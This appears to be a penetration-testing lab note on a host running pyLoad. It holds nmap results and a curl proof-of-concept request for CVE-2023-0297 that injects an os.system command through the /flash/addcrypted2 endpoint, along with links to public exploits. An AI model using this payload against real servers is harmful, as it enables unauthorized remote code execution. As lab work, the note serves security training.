_____


> [!info]
> IP=192.168.190.26

# Nmap 

|PORT|STATE|SERVICE|
|---|---|---|
|22/tcp|open|ssh|
|9666/tcp|open|zoomcp|


```python
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http://192.168.190.26:9666/
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
```


## 9666 - http

- Pyload
- 
https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad


```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"ping -c1 192.168.45.165\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://192.168.190.26:9666/flash/addcrypted2'
```

https://github.com/JacobEbben/CVE-2023-0297?source=post_page-----219922de84e5--------------------------------

https://www.exploit-db.com/exploits/51532
